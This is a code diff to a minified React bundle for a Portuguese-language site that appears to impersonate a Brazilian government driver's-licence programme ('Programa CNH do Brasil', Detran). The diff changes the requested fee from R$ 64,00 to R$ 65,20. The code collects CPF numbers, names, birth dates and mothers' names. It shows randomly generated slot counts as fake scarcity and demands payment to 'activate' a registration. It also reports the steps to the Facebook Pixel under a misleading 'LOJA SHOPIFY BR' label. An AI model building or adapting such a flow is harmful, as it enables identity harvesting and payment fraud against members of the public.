@@ -12930,7 +12930,7 @@ function d3() {
         nome: w.DADOS.nome,
         dataNascimento: w.DADOS.data_nascimento || "",data_nascimento: w.DADOS.data_nascimento || "",
         nomeMae: w.DADOS.nome_mae || ""
-      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:64.00});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:64.00});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
+      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
     } catch (h) {
       console.error("Error fetching data:", h);
       const w = {
@@ -21139,7 +21139,7 @@ function kE() {
       return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
     },
     f = h => {
-      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:64.00,num_items:1});}}catch(e){}})(); e("/chat")
+      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:65.20,num_items:1});}}catch(e){}})(); e("/chat")
     };
   return l.jsxs("div", {
     children: [l.jsx(rt, {}), l.jsx("div", {
@@ -21611,7 +21611,7 @@ function DE() {
                 children: "Valor:"
               }), l.jsx("span", {
                 className: "font-bold text-green-600",
-                children: "R$ 64,00"
+                children: "R$ 65,20"
               })]
             }), l.jsxs("div", {
               className: "flex justify-between items-center",
@@ -22070,7 +22070,7 @@ const Rg = {
 
 function OE() {
   var Ch;
-  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "Cidadão", Te = () => ["AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
+  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "Cidadão", Te = () => ["SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
     month: `${W}/2026`,
     vagas: Math.floor(Math.random() * 9) + 4
   })), ke = () => {
@@ -22328,7 +22328,7 @@ Valor Total: R$ 65,20`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 64,00, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 65,20, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -23083,7 +23083,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,00, clique no botão 
                       children: "VALOR A PAGAR EM REAIS"
                     }), l.jsx("p", {
                       className: "font-bold text-lg",
-                      children: "R$ 64,00"
+                      children: "R$ 65,20"
                     })]
                   })]
                 }), o === "awaiting_payment" && l.jsx("div", {
@@ -24890,5 +24890,7 @@ ov(document.getElementById("root")).render(l.jsx(x.StrictMode, {
     children: [l.jsx(dT, {}), l.jsx(fN, {})]
   })
 }));
+
+
 
 
